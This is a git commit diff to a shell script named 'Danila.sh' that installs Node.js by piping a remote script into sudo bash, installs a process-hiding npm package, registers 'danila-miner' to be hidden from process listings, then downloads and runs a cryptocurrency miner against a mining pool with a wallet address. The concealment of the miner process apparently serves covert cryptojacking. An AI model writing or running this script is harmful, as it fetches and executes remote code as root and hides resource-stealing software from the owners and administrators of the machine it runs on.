8b6569decd848915ed23157f2caa0f99f9fbba24
denisule54 <87700595+denisule54@users.noreply.github.com>
2022-02-25 17:42:09 +0700

    Update Danila.sh

--- Danila.sh
+++ Danila.sh
@@ -1,7 +1,6 @@
-nohup sudo apt-get update
-nohup sudo apt install screen -y
+#!/bin/sh
 curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 sudo apt install nodejs
 npm i -g node-process-hider
 sudo ph add danila-miner
-wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-xenial-hive.tar.gz && tar -xf danila-miner-2.3.1-xenial-hive.tar.gz && cd danila-miner-2.3.1-xenial && screen -d -m ./danila-miner run https://server1.whalestonpool.com EQAmlNaFmoaWvWOwFR2cAWBEsSnwQ2O9bljsXXxiEZ5CXBKG
+wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-xenial-hive.tar.gz && tar -xf danila-miner-2.3.1-xenial-hive.tar.gz && cd danila-miner-2.3.1-xenial && ./danila-miner run https://server1.whalestonpool.com EQAmlNaFmoaWvWOwFR2cAWBEsSnwQ2O9bljsXXxiEZ5CXBKG
